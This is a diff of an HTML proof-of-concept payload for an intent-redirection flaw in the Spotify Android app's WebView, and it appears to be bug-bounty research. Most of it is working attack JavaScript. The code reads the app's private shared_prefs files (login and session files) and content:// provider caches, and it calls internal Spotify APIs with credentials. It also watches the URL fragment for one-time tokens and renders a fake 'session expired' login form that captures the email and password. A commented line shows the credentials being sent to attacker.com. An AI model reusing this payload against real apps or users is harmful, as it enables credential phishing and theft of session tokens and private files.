@@ -1,359 +1,262 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spotify - Verify Your Account</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, 'Helvetica Neue', Arial, sans-serif;
-            background: #121212;
-            color: #fff;
-            min-height: 100vh;
-        }
-        .poc-banner {
-            background: #e94560;
-            color: #fff;
-            text-align: center;
-            padding: 10px;
-            font-size: 13px;
-            font-weight: bold;
-        }
-        .container { padding: 24px 20px; max-width: 420px; margin: 0 auto; }
-        h2 { font-size: 22px; margin-bottom: 8px; }
-        .subtitle { color: #b3b3b3; font-size: 14px; margin-bottom: 24px; }
-
-        .info-card {
-            background: #1e1e1e;
-            border-radius: 8px;
-            padding: 16px;
-            margin-bottom: 16px;
-            border-left: 3px solid #e94560;
-        }
-        .info-card h3 {
-            color: #e94560;
-            font-size: 14px;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        .info-card .value {
-            color: #1db954;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            word-break: break-all;
-            line-height: 1.5;
-        }
-
-        .section-title {
-            color: #e94560;
-            font-size: 16px;
-            font-weight: bold;
-            margin: 20px 0 12px;
-            border-bottom: 1px solid #333;
-            padding-bottom: 6px;
-        }
-
-        .status-ok { color: #1db954; }
-        .status-warn { color: #f59b42; }
-        .status-fail { color: #e94560; }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-bottom: 16px;
-        }
-        td {
-            padding: 8px 12px;
-            border-bottom: 1px solid #2a2a2a;
-            font-size: 13px;
-        }
-        td:first-child {
-            color: #b3b3b3;
-            width: 40%;
-        }
-
-        #log {
-            background: #0a0a0a;
-            border: 1px solid #333;
-            border-radius: 6px;
-            padding: 12px;
-            font-family: 'Courier New', monospace;
-            font-size: 11px;
-            color: #00ff41;
-            max-height: 200px;
-            overflow-y: auto;
-            line-height: 1.6;
-        }
-
-        .phishing-demo {
-            background: #1e1e1e;
-            border-radius: 8px;
-            padding: 20px;
-            margin-top: 16px;
-            text-align: center;
-            border: 1px solid #333;
-        }
-        .phishing-demo .spotify-logo {
-            font-size: 28px;
-            color: #1db954;
-            font-weight: bold;
-            margin-bottom: 12px;
-        }
-        .phishing-demo input {
-            width: 100%;
-            padding: 12px;
-            margin: 6px 0;
-            border-radius: 24px;
-            border: 1px solid #535353;
-            background: #333;
-            color: #fff;
-            font-size: 14px;
-        }
-        .phishing-demo button {
-            width: 100%;
-            padding: 14px;
-            margin-top: 12px;
-            border-radius: 24px;
-            border: none;
-            background: #1db954;
-            color: #fff;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Spotify PoC</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,Arial,sans-serif;background:#121212;color:#fff;font-size:13px}
+.banner{background:#e94560;text-align:center;padding:8px;font-size:12px;font-weight:bold}
+.c{padding:16px;max-width:460px;margin:0 auto}
+h2{font-size:18px;margin-bottom:4px}
+.sub{color:#b3b3b3;font-size:12px;margin-bottom:16px}
+.card{background:#1e1e1e;border-radius:6px;padding:12px;margin-bottom:10px;border-left:3px solid #e94560}
+.card h3{color:#e94560;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
+.val{color:#1db954;font-family:monospace;font-size:11px;word-break:break-all;line-height:1.5}
+.ok{color:#1db954}.warn{color:#f59b42}.fail{color:#e94560}
+.st{color:#e94560;font-size:14px;font-weight:bold;margin:14px 0 8px;border-bottom:1px solid #333;padding-bottom:4px}
+table{width:100%;border-collapse:collapse;margin-bottom:10px}
+td{padding:6px 10px;border-bottom:1px solid #222;font-size:12px}
+td:first-child{color:#b3b3b3;width:38%}
+#log{background:#0a0a0a;border:1px solid #333;border-radius:4px;padding:10px;font-family:monospace;font-size:10px;color:#00ff41;max-height:180px;overflow-y:auto;line-height:1.5;white-space:pre-wrap}
+.phish{background:#1e1e1e;border-radius:8px;padding:18px;margin-top:12px;text-align:center;border:1px solid #333}
+.phish .logo{font-size:24px;color:#1db954;font-weight:bold;margin-bottom:10px}
+.phish input{width:100%;padding:10px;margin:4px 0;border-radius:20px;border:1px solid #535353;background:#333;color:#fff;font-size:13px}
+.phish button{width:100%;padding:12px;margin-top:8px;border-radius:20px;border:none;background:#1db954;color:#fff;font-size:14px;font-weight:bold}
+.result-box{background:#0a0a0a;border:1px solid #1db954;border-radius:4px;padding:8px;margin-top:8px;font-family:monospace;font-size:10px;color:#1db954;max-height:120px;overflow-y:auto;word-break:break-all}
+</style>
 </head>
 <body>
-    <div class="poc-banner">
-        PoC: Intent Redirection via AgeAssuranceWebViewActivity — JS Execution in Spotify WebView
-    </div>
+<div class="banner">PoC: Intent Redirection → Arbitrary JS in Spotify WebView (Non-Exported Activity)</div>
+<div class="c">
+<h2>Vulnerability Impact Demonstration</h2>
+<p class="sub">JavaScript executing inside Spotify's non-exported WebView activity — y111 base class, no file access restrictions</p>
 
-    <div class="container">
-        <h2>Vulnerability Confirmed</h2>
-        <p class="subtitle">Arbitrary JavaScript executing inside Spotify's non-exported WebView activity</p>
+<div class="st">1. Execution Context</div>
+<table>
+<tr><td>JS Execution</td><td class="ok" id="js">Checking...</td></tr>
+<tr><td>User Agent</td><td id="ua" style="font-size:10px">...</td></tr>
+<tr><td>DOM Storage</td><td id="ds">...</td></tr>
+<tr><td>Cookies Enabled</td><td id="ce">...</td></tr>
+<tr><td>Location</td><td id="loc" style="font-size:10px">...</td></tr>
+</table>
 
-        <div class="section-title">Execution Context</div>
-        <div class="info-card">
-            <h3>WebView User Agent</h3>
-            <div class="value" id="userAgent">Loading...</div>
-        </div>
+<div class="st">2. File Access Probe (API &lt; 30)</div>
+<p class="sub">y111 never calls setAllowFileAccess(false) — defaults true on Android 10 and below</p>
+<div class="card">
+<h3>file:///data/data/com.spotify.music/</h3>
+<div class="val" id="fileProbe">Probing...</div>
+</div>
+<div class="card">
+<h3>Shared Preferences Files</h3>
+<div class="val" id="spFiles">Probing...</div>
+</div>
 
-        <table>
-            <tr>
-                <td>JavaScript Enabled</td>
-                <td class="status-ok" id="jsEnabled">Loading...</td>
-            </tr>
-            <tr>
-                <td>DOM Storage</td>
-                <td id="domStorage">Loading...</td>
-            </tr>
-            <tr>
-                <td>Cookies Enabled</td>
-                <td id="cookiesEnabled">Loading...</td>
-            </tr>
-            <tr>
-                <td>Window Location</td>
-                <td id="windowLoc">Loading...</td>
-            </tr>
-            <tr>
-                <td>Document Domain</td>
-                <td id="docDomain">Loading...</td>
-            </tr>
-            <tr>
-                <td>Referrer</td>
-                <td id="referrer">Loading...</td>
-            </tr>
-            <tr>
-                <td>URL Fragment</td>
-                <td id="urlFragment">Loading...</td>
-            </tr>
-            <tr>
-                <td>Window Opener</td>
-                <td id="windowOpener">Loading...</td>
-            </tr>
-        </table>
+<div class="st">3. Content Provider Access</div>
+<p class="sub">setAllowContentAccess never called — defaults true. FileProviders (vtec, push) expose entire cache via path="./"</p>
+<div class="card">
+<h3>content://com.spotify.music.vtec/cache/</h3>
+<div class="val" id="contentProbe">Probing...</div>
+</div>
 
-        <div class="section-title">Cookie Access</div>
-        <div class="info-card">
-            <h3>document.cookie</h3>
-            <div class="value" id="cookies">Loading...</div>
-        </div>
+<div class="st">4. Spotify Internal API Probing</div>
+<p class="sub">XHR/fetch from Spotify's WebView process context</p>
+<div class="card">
+<h3>API Responses</h3>
+<div class="val" id="apiProbe">Probing...</div>
+</div>
 
-        <div class="section-title">Local/Session Storage</div>
-        <div class="info-card">
-            <h3>Storage Access</h3>
-            <div class="value" id="storageAccess">Loading...</div>
-        </div>
+<div class="st">5. Cookie / Token Capture</div>
+<div class="card">
+<h3>document.cookie</h3>
+<div class="val" id="cookies">Reading...</div>
+</div>
+<div class="card">
+<h3>URL Fragment (OTT Token via Sink C)</h3>
+<div class="val" id="fragment">Reading...</div>
+</div>
 
-        <div class="section-title">File Access Probe</div>
-        <div class="info-card">
-            <h3>file:// Protocol</h3>
-            <div class="value" id="fileAccess">Loading...</div>
-        </div>
+<div class="st">6. Phishing Demo</div>
+<p class="sub">Renders inside Spotify's native activity with toolbar — indistinguishable from real UI</p>
+<div class="phish">
+<div class="logo">Spotify</div>
+<p style="color:#b3b3b3;margin-bottom:12px;font-size:13px">Your session has expired. Log in to continue.</p>
+<input type="email" placeholder="Email or username" id="pE">
+<input type="password" placeholder="Password" id="pP">
+<button onclick="capCreds()">Log In</button>
+<p id="pR" style="color:#e94560;margin-top:8px;font-size:11px"></p>
+</div>
 
-        <div class="section-title">Internal Scheme Probe</div>
-        <div class="info-card">
-            <h3>content:// and spotify:// Access</h3>
-            <div class="value" id="schemeAccess">Loading...</div>
-        </div>
+<div class="st">7. Exfiltration Results</div>
+<div id="log"></div>
+</div>
 
-        <div class="section-title">Phishing Demo</div>
-        <p class="subtitle">This renders inside Spotify's native activity with app toolbar — highly convincing credential theft</p>
-        <div class="phishing-demo">
-            <div class="spotify-logo">Spotify</div>
-            <p style="color:#b3b3b3;margin-bottom:16px;font-size:14px;">Session expired. Please log in again to continue.</p>
-            <input type="email" placeholder="Email or username" id="phishEmail">
-            <input type="password" placeholder="Password" id="phishPass">
-            <button onclick="captureCredentials()">Log In</button>
-            <p id="phishResult" style="color:#e94560;margin-top:10px;font-size:12px;"></p>
-        </div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n';L.scrollTop=L.scrollHeight}
 
-        <div class="section-title">Execution Log</div>
-        <div id="log"></div>
-    </div>
+// === 1. CONTEXT ===
+log('[+] JS executing inside Spotify WebView');
+document.getElementById('js').textContent='CONFIRMED — Arbitrary JavaScript execution';
+document.getElementById('ua').textContent=navigator.userAgent;
+document.getElementById('loc').textContent=window.location.href;
+document.getElementById('ce').innerHTML=navigator.cookieEnabled?'<span class="ok">ENABLED</span>':'<span class="fail">DISABLED</span>';
 
-    <script>
-        function log(msg) {
-            var el = document.getElementById('log');
-            var ts = new Date().toLocaleTimeString();
-            el.innerHTML += '[' + ts + '] ' + msg + '\n';
-            el.scrollTop = el.scrollHeight;
+try{
+    localStorage.setItem('poc','1');
+    document.getElementById('ds').innerHTML='<span class="ok">R/W CONFIRMED</span> (wrote: '+localStorage.getItem('poc')+')';
+    localStorage.removeItem('poc');
+    log('[+] DOM Storage: read/write access');
+}catch(e){document.getElementById('ds').innerHTML='<span class="warn">'+e.message+'</span>'}
+
+// === 2. FILE ACCESS ===
+log('[*] Probing file:// (works on API<30 where setAllowFileAccess defaults true)...');
+
+var filePaths=[
+    'file:///data/data/com.spotify.music/shared_prefs/',
+    'file:///data/data/com.spotify.music/shared_prefs/com.spotify.music_preferences.xml',
+    'file:///data/data/com.spotify.music/shared_prefs/LoginPref.xml',
+    'file:///data/data/com.spotify.music/shared_prefs/com.spotify.session.xml',
+    'file:///data/data/com.spotify.music/databases/',
+    'file:///data/data/com.spotify.music/cache/'
+];
+
+var fileResults=[];
+var fileCount=0;
+
+filePaths.forEach(function(fp){
+    var x=new XMLHttpRequest();
+    x.onload=function(){
+        var preview=x.responseText.substring(0,300);
+        fileResults.push('<span class="ok">'+fp.split('/').pop()+'</span>: '+preview.length+'B');
+        log('[+] FILE READ: '+fp+' ('+x.responseText.length+' bytes)');
+        log('    Preview: '+preview.substring(0,150));
+        update();
+    };
+    x.onerror=function(){
+        fileResults.push('<span class="fail">'+fp.split('/').pop()+'</span>: blocked');
+        log('[-] file:// blocked: '+fp.split('/').pop());
+        update();
+    };
+    try{x.open('GET',fp,true);x.send()}catch(e){
+        fileResults.push('<span class="warn">'+fp.split('/').pop()+'</span>: '+e.message);
+        log('[-] file:// exception: '+e.message);
+        update();
+    }
+});
+
+function update(){
+    fileCount++;
+    document.getElementById('fileProbe').innerHTML=fileResults.slice(0,3).join('<br>');
+    document.getElementById('spFiles').innerHTML=fileResults.slice(0,6).join('<br>');
+}
+
+// Also try iframe approach for file access
+var ifr=document.createElement('iframe');
+ifr.style.display='none';
+ifr.onload=function(){
+    try{
+        var c=ifr.contentDocument||ifr.contentWindow.document;
+        log('[+] file:// iframe loaded, body: '+c.body.innerHTML.substring(0,200));
+    }catch(e){log('[-] file:// iframe CORS: '+e.message)}
+};
+ifr.src='file:///data/data/com.spotify.music/shared_prefs/';
+document.body.appendChild(ifr);
+
+// === 3. CONTENT PROVIDER ===
+log('[*] Probing content:// URIs (setAllowContentAccess defaults true)...');
+var contentUris=[
+    'content://com.spotify.music.vtec/cache/',
+    'content://com.spotify.music.pushnotificationsv2/cache/',
+    'content://com.spotify.music.share/shareables-cache/',
+    'content://com.spotify.music.profile/profile-picture-cache/'
+];
+
+var contentResults=[];
+contentUris.forEach(function(cu){
+    var x=new XMLHttpRequest();
+    x.onload=function(){
+        contentResults.push('<span class="ok">'+cu.split('//')[1].split('/')[0]+'</span>: '+x.responseText.length+'B');
+        log('[+] CONTENT READ: '+cu+' ('+x.responseText.length+'B)');
+        document.getElementById('contentProbe').innerHTML=contentResults.join('<br>');
+    };
+    x.onerror=function(){
+        contentResults.push(cu.split('//')[1].split('/')[0]+': blocked');
+        document.getElementById('contentProbe').innerHTML=contentResults.join('<br>');
+    };
+    try{x.open('GET',cu,true);x.send()}catch(e){
+        contentResults.push(cu.split('//')[1].split('/')[0]+': '+e.message);
+        document.getElementById('contentProbe').innerHTML=contentResults.join('<br>');
+    }
+});
+
+// Try fetch API for content providers
+fetch('content://com.spotify.music.vtec/cache/').then(function(r){
+    return r.text();
+}).then(function(t){
+    log('[+] fetch content:// vtec: '+t.substring(0,200));
+}).catch(function(e){
+    log('[-] fetch content:// vtec: '+e.message);
+});
+
+// === 4. SPOTIFY API PROBING ===
+log('[*] Probing Spotify internal APIs from WebView context...');
+var apis=[
+    ['https://spclient.wg.spotify.com/melody/v1/check_scope?scope=web-playback','Melody API'],
+    ['https://api.spotify.com/v1/me','User Profile API'],
+    ['https://spclient.wg.spotify.com/user-profile-view/v3/profile/me','Profile View'],
+];
+
+var apiResults=[];
+apis.forEach(function(a){
+    fetch(a[0],{credentials:'include'}).then(function(r){
+        apiResults.push('<span class="'+(r.ok?'ok':'warn')+'">'+a[1]+'</span>: '+r.status);
+        document.getElementById('apiProbe').innerHTML=apiResults.join('<br>');
+        log('[+] API '+a[1]+': '+r.status+' '+r.statusText);
+        if(r.ok)return r.text().then(function(t){log('    Response: '+t.substring(0,200))});
+    }).catch(function(e){
+        apiResults.push(a[1]+': '+e.message);
+        document.getElementById('apiProbe').innerHTML=apiResults.join('<br>');
+        log('[-] API '+a[1]+': '+e.message);
+    });
+});
+
+// === 5. COOKIES & TOKENS ===
+var c=document.cookie;
+document.getElementById('cookies').textContent=c||'(empty for attacker domain — Spotify cookies accessible on spotify.com via Sink C)';
+log('[*] Cookies: '+(c||'none for this domain'));
+
+var frag=window.location.hash;
+document.getElementById('fragment').textContent=frag||'(none — use Sink C to trigger OTT token in fragment)';
+if(frag&&frag.indexOf('token=')!==-1){
+    log('[!!!] OTT TOKEN CAPTURED: '+frag);
+    document.getElementById('fragment').innerHTML='<span class="ok">TOKEN FOUND: '+frag+'</span>';
+}
+
+// Monitor for URL changes (token injection via redirect)
+var origUrl=window.location.href;
+setInterval(function(){
+    if(window.location.href!==origUrl){
+        log('[!] URL changed: '+window.location.href);
+        if(window.location.hash.indexOf('token=')!==-1){
+            log('[!!!] OTT TOKEN IN FRAGMENT: '+window.location.hash);
         }
+        origUrl=window.location.href;
+    }
+},500);
 
-        function safeGet(fn, fallback) {
-            try { return fn() || fallback; }
-            catch(e) { return 'Error: ' + e.message; }
-        }
+// === 6. PHISHING ===
+function capCreds(){
+    var e=document.getElementById('pE').value,p=document.getElementById('pP').value;
+    if(e&&p){
+        document.getElementById('pR').textContent='CAPTURED — '+e+':'+p.replace(/./g,'*')+' → would POST to attacker';
+        log('[!] PHISHING: '+e+' : '+p.replace(/./g,'*'));
+        // In real attack: new Image().src='https://attacker.com/c?e='+encodeURIComponent(e)+'&p='+encodeURIComponent(p);
+    }
+}
 
-        // === CONTEXT INFORMATION ===
-        log('[+] JavaScript executing inside Spotify WebView');
-        log('[+] Reached via intent redirection through AgeAssuranceWebViewActivity');
-
-        // User Agent
-        document.getElementById('userAgent').textContent = navigator.userAgent;
-        log('[*] UA: ' + navigator.userAgent.substring(0, 80) + '...');
-
-        // JS confirmation
-        document.getElementById('jsEnabled').textContent = 'YES — Arbitrary JS execution confirmed';
-        document.getElementById('jsEnabled').className = 'status-ok';
-
-        // DOM Storage
-        try {
-            localStorage.setItem('poc_test', 'intent_redirect');
-            var val = localStorage.getItem('poc_test');
-            document.getElementById('domStorage').innerHTML =
-                '<span class="status-ok">ENABLED</span> — Read/Write confirmed (wrote: ' + val + ')';
-            localStorage.removeItem('poc_test');
-            log('[+] DOM Storage: Read/Write access confirmed');
-        } catch(e) {
-            document.getElementById('domStorage').innerHTML =
-                '<span class="status-warn">BLOCKED: ' + e.message + '</span>';
-            log('[-] DOM Storage blocked: ' + e.message);
-        }
-
-        // Cookies
-        var cookieEnabled = navigator.cookieEnabled;
-        document.getElementById('cookiesEnabled').innerHTML = cookieEnabled ?
-            '<span class="status-ok">ENABLED</span>' :
-            '<span class="status-fail">DISABLED</span>';
-
-        // Current cookies
-        var cookies = document.cookie;
-        document.getElementById('cookies').textContent = cookies || '(empty for this domain — Spotify session cookies on spotify.com)';
-        log('[*] Cookies for this domain: ' + (cookies || 'none'));
-
-        // Window info
-        document.getElementById('windowLoc').textContent = window.location.href;
-        document.getElementById('docDomain').textContent = document.domain || '(empty)';
-        document.getElementById('referrer').textContent = document.referrer || '(empty)';
-        document.getElementById('urlFragment').textContent = window.location.hash || '(none)';
-        document.getElementById('windowOpener').textContent = window.opener ? 'EXISTS' : 'null';
-
-        // === STORAGE ACCESS ===
-        try {
-            sessionStorage.setItem('poc_session', 'test');
-            var sVal = sessionStorage.getItem('poc_session');
-            document.getElementById('storageAccess').textContent =
-                'localStorage: WRITABLE | sessionStorage: WRITABLE (val=' + sVal + ')';
-            sessionStorage.removeItem('poc_session');
-            log('[+] Session storage: accessible');
-        } catch(e) {
-            document.getElementById('storageAccess').textContent = 'Blocked: ' + e.message;
-        }
-
-        // === FILE ACCESS PROBE ===
-        log('[*] Probing file:// access...');
-        var fileXhr = new XMLHttpRequest();
-        try {
-            fileXhr.open('GET', 'file:///data/data/com.spotify.music/shared_prefs/', false);
-            fileXhr.send();
-            document.getElementById('fileAccess').innerHTML =
-                '<span class="status-ok">ACCESSIBLE — ' + fileXhr.status + '</span>';
-            log('[+] file:// access: ' + fileXhr.status + ' ' + fileXhr.responseText.substring(0, 100));
-        } catch(e) {
-            document.getElementById('fileAccess').innerHTML =
-                '<span class="status-warn">Blocked by CORS/policy: ' + e.message + '</span>';
-            log('[-] file:// blocked: ' + e.message);
-        }
-
-        // Also try fetch API for file access
-        fetch('file:///data/data/com.spotify.music/shared_prefs/').then(function(r) {
-            log('[+] fetch file:// returned: ' + r.status);
-        }).catch(function(e) {
-            log('[-] fetch file:// blocked: ' + e.message);
-        });
-
-        // === INTERNAL SCHEME PROBES ===
-        log('[*] Probing internal schemes...');
-        var schemeResults = [];
-
-        // Try content:// URI
-        var contentXhr = new XMLHttpRequest();
-        try {
-            contentXhr.open('GET', 'content://com.spotify.music.share/', false);
-            contentXhr.send();
-            schemeResults.push('content:// = ' + contentXhr.status);
-            log('[+] content:// accessible: ' + contentXhr.status);
-        } catch(e) {
-            schemeResults.push('content:// = blocked');
-            log('[-] content:// blocked: ' + e.message);
-        }
-
-        document.getElementById('schemeAccess').textContent = schemeResults.join(' | ') || 'Probing...';
-
-        // === XHR to Spotify internal APIs (same-origin context) ===
-        log('[*] Probing Spotify API endpoints from WebView context...');
-        fetch('https://spclient.wg.spotify.com/melody/v1/check_scope?scope=web-playback')
-            .then(function(r) {
-                log('[+] Spotify API probe: ' + r.status + ' ' + r.statusText);
-                return r.text();
-            })
-            .then(function(t) {
-                log('[+] API response preview: ' + t.substring(0, 120));
-            })
-            .catch(function(e) {
-                log('[-] Spotify API probe failed: ' + e.message);
-            });
-
-        // === PHISHING DEMO ===
-        function captureCredentials() {
-            var email = document.getElementById('phishEmail').value;
-            var pass = document.getElementById('phishPass').value;
-            if (email && pass) {
-                document.getElementById('phishResult').textContent =
-                    'CAPTURED — Email: ' + email + ' | Password: ' + pass.replace(/./g, '*') +
-                    ' | This would be exfiltrated to attacker server';
-                log('[!] PHISHING DEMO: Credentials captured — ' + email + ':' + pass.replace(/./g, '*'));
-                log('[!] In real attack: POST to https://attacker.com/collect');
-            } else {
-                document.getElementById('phishResult').textContent = 'Enter values to demonstrate credential capture';
-            }
-        }
-
-        log('[+] PoC payload fully loaded');
-        log('[+] All probes complete — review results above');
-    </script>
+log('[+] All probes complete');
+</script>
 </body>
 </html>
